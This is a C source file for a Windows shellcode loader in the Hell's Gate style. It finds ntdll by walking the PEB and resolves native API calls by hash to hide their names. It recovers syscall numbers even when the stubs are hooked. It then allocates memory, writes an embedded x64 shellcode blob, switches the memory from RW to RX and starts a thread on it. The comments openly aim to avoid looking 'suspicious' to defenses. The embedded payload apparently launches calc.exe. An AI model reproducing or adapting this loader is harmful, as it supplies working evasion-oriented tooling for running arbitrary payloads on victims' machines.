#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
#include <winternl.h>
#include <stdbool.h>
#include "set.h"


typedef int32_t(__stdcall* pNtAllocateVirtualMemory)(
    void* ProcessHandle, void** BaseAddress, uintptr_t ZeroBits,
    size_t* RegionSize, uint32_t AllocationType, uint32_t Protect
    );

typedef int32_t(__stdcall* pNtWriteVirtualMemory)(
    void* ProcessHandle, void* BaseAddress, void* Buffer,
    size_t NumberOfBytesToWrite, size_t* NumberOfBytesWritten
    );

typedef int32_t(__stdcall* pNtProtectVirtualMemory)(
    void* ProcessHandle, void** BaseAddress, size_t* RegionSize,
    uint32_t NewProtect, uint32_t* OldProtect
    );

typedef int32_t(__stdcall* pNtCreateThreadEx)(
    void** ThreadHandle, uint32_t DesiredAccess, void* ObjectAttributes,
    void* ProcessHandle, void* StartRoutine, void* Argument,
    uint32_t CreateFlags, uintptr_t ZeroBits, size_t StackSize,
    size_t MaxStackSize, void* AttributeList
    );

extern void HellsGate(unsigned int wSysCall);
extern int32_t HellsDescent();

// This is a my own spin on a string searching algorithm.
static bool ntStrMatch(UNICODE_STRING* word, char * target)
{
    int i = 0;
    // word.Length / 2 is necessary for wchar_t strings & -4 is to keep it from not going out of bounds.
    // If the 5th last character is not inside the pattern no need to search the rest.
    while (i < word->Length / 2 - 4 ) 
    {
        int j = 0;
        char l = (char)word->Buffer[i] | 0x20; // Space bar trick, Ask Gemini about it.
        while (j < 5 && l == target[j])
        {
            if (++j == 5) {return true;} // As soon as it becomes 5, return the function.
            l = (char)word->Buffer[i+j] | 0x20;
        }
        if (--j > 0) i = j + i; // Improves worst case. 
        else i = i + 1;
    }
    return false;
}

int myStrCmp(const char* str1, const char* str2) 
{
    while (*str1 && (*str1 == *str2)) 
    {
        str1++;
        str2++;
    }
    return *str1-*str2;
}

int myStrLen(const char* str)
{
    int count = 0;
    while (*str) 
    {
        str++;
        count++;
    }
    return count;
}

int walkingTheFns(SimpleSet* set, uint8_t * ptrToFn, uint64_t hash) 
{
    int cw = 0;
    int SSNFound = 0;

    while ((ptrToFn[cw] != 0xC3 && !(ptrToFn[cw] == 0x0F && ptrToFn[cw + 1] == 0x05)) && SSNFound != 1 && cw < 64)
    {
        if (ptrToFn[cw] == 0x4C)
        {
            if (ptrToFn[cw + 1] == 0x8B &&
                ptrToFn[cw + 2] == 0xD1 &&
                ptrToFn[cw + 3] == 0xB8 &&
                ptrToFn[cw + 6] == 0x00 &&
                ptrToFn[cw + 7] == 0x00)
            {
                unsigned int* tmp = (unsigned int*)(ptrToFn + (cw + 4));
                InsertSetItem(set, hash, ptrToFn, *tmp);
                SSNFound = 1;
            }
        }
        cw++;
    }
    if (SSNFound == 1){ return 1; }
    return 0;
}


int main ()
{
    // Reading GS register and going to offset 96 to find address of PEB.
    PEB * PEBaddr = __readgsqword(96);

    // These are the doubly link list that hold the LDR entries which contain all the DLLs
    uintptr_t* start = PEBaddr->Ldr->InMemoryOrderModuleList.Blink->Flink; // Don't fuck with something that works.
    uintptr_t* back = PEBaddr->Ldr->InMemoryOrderModuleList.Blink;
    LDR_DATA_TABLE_ENTRY* currEntry;
    void* ntdllAddr = NULL;
    while (back != start) // Looping backwards until we find the first again.
    {
        // Link list
        currEntry = back - 2; // Going to the beginning of the struct/object.
        
        if (ntStrMatch(&currEntry->FullDllName, "ntdll"))
        {
            ntdllAddr = currEntry->DllBase;
        }
        back = currEntry->InMemoryOrderLinks.Blink; // Moving backwards in the link list.
    }
    // Base of ntdll. Casting it to a 1 byte pointer.
    uint8_t * base = ntdllAddr; 
    // el_fxxx something, I don't remember the name, it has the offset to the NT Headers.
    unsigned int el_f = *(unsigned int*)(base + 0x3C);
    uint8_t* NTHeaderAddr = base + el_f;
    IMAGE_NT_HEADERS64 * NtHeaders= (IMAGE_NT_HEADERS64*)NTHeaderAddr;
    IMAGE_OPTIONAL_HEADER64 * OptionalHeaders = &NtHeaders->OptionalHeader;
    unsigned int EATOffset = OptionalHeaders->DataDirectory[0].VirtualAddress;
    IMAGE_EXPORT_DIRECTORY * EAT = base + EATOffset;
    DWORD * BaseOfNameArray = (DWORD*)(EAT->AddressOfNames + base);

    //                              0                            1                        3                     2                
    //char* arrOfStr[] = { "NtAllocateVirtualMemory", "NtWriteVirtualMemory","NtProtectVirtualMemory", "NtCreateThreadEx" };
    const uint64_t* arrOfStr[] = { 5756219066126317112,6578799286135367762,8029253446625316198,1575515690690218010 }; // ARRANGED IN ORDER OF EXECUTION DO NOT CHANGE.
    int sizeOfArrStr = 4;
    size_t n = EAT->NumberOfNames;
    SimpleSet * set = CreateSet(4);
    char* CurrStr;
    for (size_t i = 0 ; i < n; i ++ ) 
    {
        // Optimization which checks 2 characters at once. unsigned short is 2 bytes long.
        // 744E is Hex for tN, little endian applies so it is actually Nt
        CurrStr = (char*)base + BaseOfNameArray[i];
        if (*(unsigned short*)CurrStr == 0x744E && (CurrStr[2] == 'A' || CurrStr[2] == 'C' || CurrStr[2] == 'W' || CurrStr[2] == 'P'))
        {
            uint64_t hash = FNV_Hashing(CurrStr, myStrLen(CurrStr));
            for (int j = 0; j < sizeOfArrStr ; j++)
            {
                if ( hash ==  arrOfStr[j] ) 
                {
                    InsertSetBucket(set, hash, i);
                }
            }
        }
    }
    
    unsigned int* numFromOrdinals = (unsigned int*)malloc(sizeof(unsigned int) * set->count);
    uintptr_t * addrOfFns = (uintptr_t*)malloc(sizeof(uintptr_t) * set->count);
    unsigned short* BaseOfOrdinalArray = (unsigned short*)(EAT->AddressOfNameOrdinals + base);
    unsigned int* BaseOfFnArray = (unsigned int*)(EAT->AddressOfFunctions + base);
    unsigned short* var = NULL;

    for (int i = 0; i < set->count; i++) 
    {
        SetItem* item = GetSetItem(set, arrOfStr[i]);
        int odNum = item->ordinalNum;
        numFromOrdinals[i] = BaseOfOrdinalArray[odNum];
        addrOfFns[i] = BaseOfFnArray[numFromOrdinals[i]] + base;
        
        uint8_t * ptrToFn = addrOfFns[i];
       
        if (walkingTheFns(set, ptrToFn, arrOfStr[i]) == 0)
        {
            int left, right;
            uint8_t* rightFn;
            uint8_t* leftFn;
            int inc = 0;
            do
            {
                inc += 32;
                rightFn = ptrToFn + inc;
                leftFn = ptrToFn - inc;
                right = walkingTheFns(set, rightFn, arrOfStr[i]);
                left = walkingTheFns(set, leftFn, arrOfStr[i]);
            } while (left == 0 && right == 0 && inc < 2000);
            
            if (left == 1) {item->SSN = item->SSN + (inc/32);}      // This should be okay, but using the InsertSetItem Function would be better.
            else { item->SSN = item->SSN - (inc/32); }
        }
      
    }


    for (int i = 0; i < set->count; i++)
    {
        SetItem* item = GetSetItem(set, arrOfStr[i]);
        printf("The SSNs are : %d\n", item->SSN);
    }
    unsigned char shellcode[] =
        "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
        "\x48\x83\xec\x20\x41\xff\xd6";


    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)HellsDescent;
    pNtWriteVirtualMemory NtWriteVir = (pNtWriteVirtualMemory)HellsDescent;
    pNtProtectVirtualMemory NtProtect = (pNtProtectVirtualMemory)HellsDescent;
    pNtCreateThreadEx NtCreate = (pNtCreateThreadEx)HellsDescent;
    NTSTATUS NtAllocSTATUS;
    NTSTATUS NtWriteVirSTATUS;
    NTSTATUS NtProtectSTATUS;
    NTSTATUS NtCreateSTATUS;

    uint32_t previousProt;



    void* BaseAddress = NULL;
    size_t sizeOfPayload = 205;
    size_t allocSize = sizeOfPayload;
    void* ThreadHandle = NULL;

    for (int i = 0; i < sizeOfArrStr; i++) 
    {
        SetItem* item = GetSetItem(set, arrOfStr[i]);

        switch ((unsigned long long)arrOfStr[i])
        {
            case 5756219066126317112:   // NtAllocateVirtualMemory
                HellsGate(item->SSN);

                NtAllocSTATUS = NtAlloc((void*)-1,          // Process Handle. -1 means itself or ownself.
                                        &BaseAddress,       // What memory address you want data to be written, or give a preferred address.
                                        0,                  // Just ignore, usually set for 32bit compatablity 
                                        &allocSize,         // Number of bytes allocate
                                        0x3000,             // MEM_RESERVE | MEM_COMMIT. We are basically the kernel to first reserve, and then give us that reserved memory
                                        0x04);              // CRITIAL: Page ACL permissions. We are ONLY requesting RW permissions for now, because RWX is very suspicious.
                                
                break;
            
            case 6578799286135367762:  // NtWriteVirtualMemory
                HellsGate(item->SSN);

                NtWriteVirSTATUS = NtWriteVir(  (void*)-1,      // Process handle.
                                                BaseAddress,    // Where to write it inside of the process.
                                                shellcode,      // Pointer the shellcode.
                                                sizeOfPayload,  // Size of the shellcode.
                                                NULL);          // Optional verification check, simply returns how many bytes were successfully written.

                break;

            case 1575515690690218010:   // NtCreateThreadEx
                HellsGate(item->SSN);

                NtCreateSTATUS = NtCreate(  &ThreadHandle,      // A pointer to the variable that will recieve the handle to the new thread.
                                            0x1FFFFF,           // Access Permissions, 1FFFFF means I want all permissions.
                                            NULL,               // Optional flag, I just left it as NULL
                                            (void*)-1,          // Process Handle
                                            BaseAddress,        // Where does the executable code start from or where should the thread point the RIP.
                                            NULL,               // This can be useful, it basically means a pointer we can pass to the code, like a struct or something.
                                            0,                  // Creation Flag, Not well documented, 0 means run immediately.
                                            NULL,               // Rest are optional, NULL tells the kernel to use the defaults.
                                            NULL,               // ^
                                            NULL,               // ^
                                            NULL);              // ^
                        
                break;

            case 8029253446625316198: // NtProtectVirtualMemory
                HellsGate(item->SSN);

                NtProtectSTATUS = NtProtect((void*)-1,      // Explained alr
                                            &BaseAddress,   // Explained alr
                                            &sizeOfPayload, // Explained alr
                                            0x20,           // Changing the ACL permissions of the page from RW to RX, so we can run the injected code.
                                            &previousProt); // Idk you just need this, it's useless though.



                break;
        }

    }


    printf("[*] Allocation Status: 0x%X\n", NtAllocSTATUS);
    printf("[*] Write Status:      0x%X\n", NtWriteVirSTATUS);
    printf("[*] Protect Status:    0x%X\n", NtProtectSTATUS);
    printf("[*] Create Status:     0x%X\n", NtCreateSTATUS);

    if (NtCreateSTATUS == 0) {
        printf("[+] Thread successfully created! Thread Handle: 0x%p\n", ThreadHandle);
    }
    else {
        printf("[-] Failed to create thread.\n");
    }


    getchar();



    return 0; // Most difficult part of the program.
}